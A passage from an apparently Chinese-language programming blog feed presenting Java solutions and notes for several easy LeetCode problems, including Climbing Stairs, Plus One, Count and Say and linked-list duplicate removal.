            head的下一个节点 &lt;-- null
        }
    }else{
        head &lt;-- head的下一个节点
    }
}
</code></pre><p>这里用了最简单的思路：</p>
<blockquote>
<p>当前节点如果和下一个节点的值相等，则删除下一个节点（如何删除下一个节点，则应该判断下下一个节点的下一个节点是否为null），同时指针不向后遍历。<br>如果不等，则遍历下一个节点。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoveDuplicatesfromSortedList</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates1</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode first = head;</span><br><span class="line">        <span class="keyword">while</span>(first.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            ListNode second = first.next;</span><br><span class="line">            <span class="keyword">if</span>(second.val == first.val)&#123;</span><br><span class="line">                ListNode third = second.next;</span><br><span class="line">                <span class="keyword">if</span>(third!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    second.val = third.val;</span><br><span class="line">                    second.next = third.next;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    Err : second = null;//Only pont second is null;</span></span><br><span class="line"><span class="comment">                    We need first.next = null;</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                    first.next = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                first = first.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>优化</strong><br>上述的方法其实太过复杂了，应该是可以优化的。我从<code>first.next!=null</code>作为的循环判断条件。最好的话，其实使用head != null是最快捷的。</p>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoveDuplicatesfromSortedList</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates2</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode preNode = <span class="keyword">new</span> ListNode(<span class="number">9527</span>);</span><br><span class="line">        preNode.next = head;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head.next!=<span class="keyword">null</span> &amp;&amp; head.val == head.next.val)&#123;</span><br><span class="line">                head.next = head.next.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                head = head.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> preNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="更好的方法"><a href="#更好的方法" class="headerlink" title="更好的方法"></a>更好的方法</h2><p>采用递归，便于阅读以及理解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoveDuplicatesfromSortedList</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span> || head.next==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        head.next = deleteDuplicates(head.next);</span><br><span class="line">        <span class="keyword">return</span> head.val == head.next.val?head.next:head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>代码感悟</strong></p>
<blockquote>
<p>其实挺想写一下这个递归思路的，看了这个递归，其实是尾递归的一种，一开始上去确实还不太会写。主要分为3步：</p>
<ol>
<li>边界判断，如果head为null或者head没有后面的节点，则直接返回head;<br></li>
<li>head的下一个节点是递归调用这个函数的返回值。这里有说法，如果函数走到这里，倒数3个三个节点已经确定了！因为最后一个节点为null，倒数第一个节点只有一个，倒数第二个节点现在的下一个节点指向了倒数第一个节点;<br></li>
<li>递归的核心，函数返回值，判断当前节点和下一个节点的值是否相等，以此来决定返回值。<br><br>这种尾递归的操作，感觉还是挺值得思考的！</li>
</ol>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这道题使用各种方法都可以解决，关键是解决的思路有所不同。第一种是我最先想到的，虽然逻辑上没有问题，但其实，如果采用第二种逻辑上的判断，则代码上会更少，可读性更好。<br><br>至于最后一种递归方案，我觉得是我最值得去学习的，很好的思路和方法！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Optimize(优化)</tag>
        <tag>LinkedList(链表)</tag>
      </tags>
  </entry>
  <entry>
    <title>70. Climbing Stairs</title>
    <url>/2017/04/25/70-Climbing-Stairs/</url>
    <content><![CDATA[<p>You are climbing a stair case. It takes n steps to reach to the top.</p>
<p>Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?<br><a id="more"></a></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote>
<p>这道题目，第一眼看过去，就是想到了递归解决。</p>
</blockquote>
<p><strong>源码</strong><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClimbingStairs</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">return</span> climbStairs(n-<span class="number">1</span>)+climbStairs(n-<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>OK，AC不过。</p>
<pre><code>Time Limit Exceeded
Last Input: 44
</code></pre><p>由于递归的占用内存很大，所以这里当输入44时，出现了超时。</p>
<p><strong>如何解决？</strong></p>
<blockquote>
<p>我记得，能用递归解决的问题，一定能用循环解决。那这道题换个思路，用循环。可以借用一下动态规划的方法。</p>
</blockquote>
<p><strong>源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClimbingStairs</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>];</span><br><span class="line">		arr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">		arr[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">			arr[i] = arr[i-<span class="number">1</span>] + arr[i-<span class="number">2</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> arr[n];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>至此，已经可以AC过了，但是。还是不够，因为它的空间复杂度是O(n)。仔细思考一下，其实它所需要的变量只要3个就够了，而不需要数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(n&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> oneStepBefore = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> twoStepBefore = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> allWays = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">			1 2 3 5 8</span></span><br><span class="line"><span class="comment">			t o a</span></span><br><span class="line"><span class="comment">			  t o a</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++)&#123;</span><br><span class="line">			allWays = oneStepBefore + twoStepBefore;</span><br><span class="line">			twoStepBefore = oneStepBefore;</span><br><span class="line">			oneStepBefore = allWays;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> allWays;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>能用递归解决的问题，一定要考虑他的开销，递归虽然很快捷，但是他的开销也很大，如果需要很深的递归，那么不妨考虑下使用动态规划。或者如果可能的情况下，一定要考虑下使用循环。以减少递归带来的问题。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Optimize(优化)</tag>
        <tag>DP(动态规划)</tag>
      </tags>
  </entry>
  <entry>
    <title>66. Plus One</title>
    <url>/2017/04/24/66-Plus-One/</url>
    <content><![CDATA[<p>Given a non-negative number represented as an array of digits, plus one to the number.</p>
<p>The digits are stored such that the most significant digit is at the head of the list.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>其实，仔细看这道题，进位运算是这道题的考点。何时进位，如何进位，以及连续的进位应该怎么做？</p>
<p><strong>伪码</strong></p>
<pre><code>for(i&lt;--digits[digits的长度-1];i&gt;=0;i--){
    if(digits[i]&lt;9){//这里很巧妙，小于9，则直接+1后return，如果能想到这里的话，基本上就很简单了
        digits[i]++;
        return digits;
    }else{
        digits[i] = 0;//这里其实只需要置0即可，因为这里最大的进位仅为1，所以不需要考虑大于1的进位
    }
}
newDigits数组 &lt;-- 新数组[digits的长度+1]//到达了这一步仍没有返回，说明，每一位都是9，所以，出现了比原数组多了一位。
newDigits[0] &lt;-- 1;
return newDigits;
</code></pre><p><strong>源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PlusOne</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] plusOne(<span class="keyword">int</span>[] digits) &#123;</span><br><span class="line">        <span class="keyword">if</span>(digits.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> digits;</span><br><span class="line">        <span class="keyword">int</span> i = digits.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(digits[i]&lt;<span class="number">9</span>)&#123;</span><br><span class="line">                digits[i]++;</span><br><span class="line">                <span class="keyword">return</span> digits;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                digits[i] = <span class="number">0</span>;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> []newDigits = <span class="keyword">new</span> <span class="keyword">int</span>[digits.length+<span class="number">1</span>];</span><br><span class="line">        newDigits[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> newDigits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] plusOne(<span class="keyword">int</span>[] digits) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=digits.length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(digits[i]&lt;<span class="number">9</span>)&#123;</span><br><span class="line">            digits[i]++;</span><br><span class="line">            <span class="keyword">return</span> digits;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            digits[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> newDigits = <span class="keyword">new</span> <span class="keyword">int</span>[digits.length+<span class="number">1</span>];</span><br><span class="line">    newDigits[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> newDigits;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><blockquote>
<p>这道题其实对我来说很难。对于进位运算的操作和实践太少，思路也不够清晰。<br><br>主要思路在于，对于位上是9的操作，只需要将该位置0，而对于位上小于9的操作，只需要该位加1，返回即可。这是加1运算的局限，不需要单独的进位变量，因为进位最大不会超过1。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>进位运算其实很考察逻辑，需要注意的是进位。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>58. Length of Last Word</title>
    <url>/2017/04/21/58-Length-of-Last-Word/</url>
    <content><![CDATA[<p>Given a string s consists of upper/lower-case alphabets and empty space characters <code>&#39; &#39;</code>, return the length of last word in the string.</p>
<p>If the last word does not exist, return 0.</p>
<p>Note: A word is defined as a character sequence consists of non-space characters only.</p>
<p>For example,<br>Given s = <code>&quot;Hello World&quot;</code>,<br>return <code>5</code>.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>伪码</strong></p>
<pre><code>inputString &lt;-- 输入字符串消去前后多余的空白字符
wordsArray[] &lt;-- inputString按照空格&quot; &quot;分割成字符串数组
if wordsArray的长度 == 0
return 0
else
return 数组最后元素的长度
</code></pre><p><strong>Java源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LengthofLastWord</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		String inString = s.trim();</span><br><span class="line">		String wordsArray[] = inString.split(<span class="string">" "</span>);</span><br><span class="line">		<span class="keyword">return</span> wordsArray.length==<span class="number">0</span>?<span class="number">0</span>:wordsArray[wordsArray.length-<span class="number">1</span>].length();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p>方法一操作过于复杂，不如直接操作字符效率高。</p>
<p><strong>伪码</strong></p>
<pre><code>inputString &lt;-- 输入字符串消去前后多余的空白字符
设置计数length &lt;-- 0
for(i&lt;--inputString的长度;i&gt;=0;i--){
    if(inputString在i处索引的字符不是空字符&apos; &apos;){
        length++;
    }else{
        跳出循环
    }
}
return length
</code></pre><p><strong>Java源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LengthofLastWord</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	String inString = s.trim();</span><br><span class="line">	<span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=inString.length()-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(inString.charAt(i)!=<span class="string">' '</span>)&#123;</span><br><span class="line">			length++;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>easy题，过！先看下有没有叼一点其他解法。OK~~有个写法比我吊的。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> s.trim().length()-s.trim().lastIndexOf(<span class="string">" "</span>)-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其他思路：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	s = s.trim();</span><br><span class="line">	<span class="keyword">int</span> lastIndex = s.lastIndexOf(<span class="string">' '</span>) + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> s.length() - lastIndex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>好了，不要讨论难易了，简单题更应该多看看多解性！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
      </tags>
  </entry>
  <entry>
    <title>38. Count and Say</title>
    <url>/2017/04/20/38-Count-and-Say/</url>
    <content><![CDATA[<p>The count-and-say sequence is the sequence of integers beginning as follows:</p>
<font><code>1, 11, 21, 1211, 111221, ...</code></font>

<p><font><code>1</code></font> is read off as <font><code>&quot;one 1&quot;</code></font> or <font><code>11</code></font>.<br></p>
<p><font><code>11</code></font> is read off as <font><code>&quot;two 1s&quot;</code></font> or <font><code>21</code></font>.<br></p>
<p><font><code>21</code></font> is read off as <font><code>&quot;one 2</code></font>, then <font><code>one 1&quot;</code></font> or <font><code>1211</code></font>.<br><br>Given an integer n, generate the nth sequence.<br></p>
<p>Note: The sequence of integers will be represented as a string.</p>
<style type="text/css">
font{
color:rgb(199,37,78)
}
</style>

<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><blockquote>
<p>递归思想，要想知道3层，需要知道2层，需要知道1层，了解了按照递归的思路来实现即可！</p>
</blockquote>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>这题思路很简单，但是实际操作的时候还是遇到了一点问题。在于生成新的字符串时，对于连续的相同的字符进行判断记录。</p>
<ul>
<li><p>如果当前字符和前一个字符不相等，则应该将当前字符的数量和当前字符添加到新字符串中。</p>
</li>
<li><p>如果当前字符和前一个字符相等，则应该将对该字符的计数加一。</p>
</li>
<li><p>对于循环的起始应该是从1开始比较好，结束应该是上一次返回的字符串长度加一。</p>
</li>
</ul>
<p>附：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">countAndSay</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		String preStr = countAndSay(n-<span class="number">1</span>);</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;preStr.length()+<span class="number">1</span>;i++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(i==preStr.length() || preStr.charAt(i)!=preStr.charAt(i-<span class="number">1</span>))&#123;</span><br><span class="line">				sb.append(count).append(preStr.charAt(i-<span class="number">1</span>));</span><br><span class="line">				count = <span class="number">1</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				count++;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这类题需要快速定位到递归的思路，这种层层相扣的，当前结果需要上次的结果作为输入的问题。在一定程度上使用递归效果很不错。另外对于连续性问题的判断，这种循环的解决技巧也应该谨记！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>连续性判断</tag>
      </tags>
  </entry>
  <entry>
    <title>27. Remove Element</title>
    <url>/2017/03/16/27-Remove-Element/</url>
    <content><![CDATA[<p>Given an array and a value, remove all instances of that value in place and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this in place with constant memory.</p>
<p>The order of elements can be changed. It doesn’t matter what you leave beyond the new length.</p>
<p>Example:<br>Given input array nums = <font color="rgb(199,37,78)"><code>[3,2,2,3]</code></font>, val = <font color="rgb(199,37,78)"><code>3</code></font></p>
<p>Your function should return length = 2, with the first two elements of nums being 2.<br><a id="more"></a></p>
<h1 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h1><blockquote>
<p>利用了和RemoveDuplicatesfromSortedArray相同的思想，时间复杂度O(n)<br><br>利用length既可以该值既可以表示索引，也可以表示索引长度，将比较重复的逻辑换成比较数组元素和val即可！</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// length is the return array's length</span></span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">    	<span class="keyword">if</span>(nums[i] == val) </span><br><span class="line">    		<span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//we can also use length as index to cover val</span></span><br><span class="line">    	nums[length] = nums[i];</span><br><span class="line">    	length++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><blockquote>
<p>这道题目我隐约记得，以前在解决JavaScript中的数组删除指定或者相同元素时，使用过这种类似的方法，虽然数组大小不改变，但是使用了一个值来记录所需要的数组长度，并把该长度内不需要的元素删除并替换。<br></p>
</blockquote>
<p><strong>补充：</strong></p>
<blockquote>
<p>看到了解析后，我觉得我想的不够全面，这道题解法到此为止了么，还可以优化么？最好情况或者最差情况是什么？平均的复杂度怎么样？</p>
</blockquote>
<p>考虑一个最坏情况：</p>
<pre><code>nums = [1,2,3,5,4], val = 4
</code></pre><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i+<span class="number">1</span>]==val)&#123;</span><br><span class="line">                nums[i+<span class="number">1</span>] = nums[n--];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>P.S.对索引的操作应该极为小心。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Optimize(优化)</tag>
      </tags>
  </entry>
  <entry>
    <title>26. Remove Duplicates from Sorted Array</title>
    <url>/2017/03/16/26-Remove-Duplicates-from-Sorted-Array/</url>
    <content><![CDATA[<p>Given a sorted array, remove the duplicates in place such that each element appear only once and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this in place with constant memory.</p>
<p>For example,<br>Given input array nums = <font color="rgb(199,37,78)"><code>[1,1,2]</code></font>,</p>
<p>Your function should return length = <font color="rgb(199,37,78)"><code>2</code></font>, with the first two elements of nums being <font color="rgb(199,37,78)"><code>1</code></font> and <font color="rgb(199,37,78)"><code>2</code></font> respectively. It doesn’t matter what you leave beyond the new length.</p>
<a id="more"></a>
<h1 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h1><blockquote>
<p>去除重复元素，并返回数组长度。<br><br>注意：这题并不是真正的让你删除重复元素，因为那么做浪费了空间，需要重新再定义一个数组。<br><br>需要设置一个长度length（该值既可以表示索引，也可以表示索引长度），遍历数组，当数组相邻元素重复时，将当前索引处的值赋给length为索引处，同时length++；<br><br>遍历完成后，返回length</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i]==nums[i-<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[index++] = nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个题和js上操作数组相似，不需要求得一个新的数组，而只是想得到某一区间上的数组元素。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
      </tags>
  </entry>
  <entry>
    <title>24. Swap Nodes in Pairs</title>
    <url>/2017/03/07/24-Swap-Nodes-in-Pairs/</url>
    <content><![CDATA[<p>Given a linked list, swap every two adjacent nodes and return its head.</p>
<p>For example,<br>Given <font color="rgb(199,37,78)"><code>1-&gt;2-&gt;3-&gt;4</code></font>, you should return the list as <font color="rgb(199,37,78)"><code>2-&gt;1-&gt;4-&gt;3</code></font>.</p>
<p>Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.</p>
<a id="more"></a>
<h1 id="Solution："><a href="#Solution：" class="headerlink" title="Solution："></a>Solution：</h1><h2 id="循环解决"><a href="#循环解决" class="headerlink" title="循环解决"></a>循环解决</h2><blockquote>
<p>先明确链表元素交换，这样就好做了！</p>
</blockquote>
<p><img src="http://i.imgur.com/Yxya3WY.png" alt></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote>
<ol>
<li>通过temp节点获取first和second的索引，并且交换两个元素；</li>
<li>重新获取temp元素，并重复步骤1。</li>
</ol>
</blockquote>
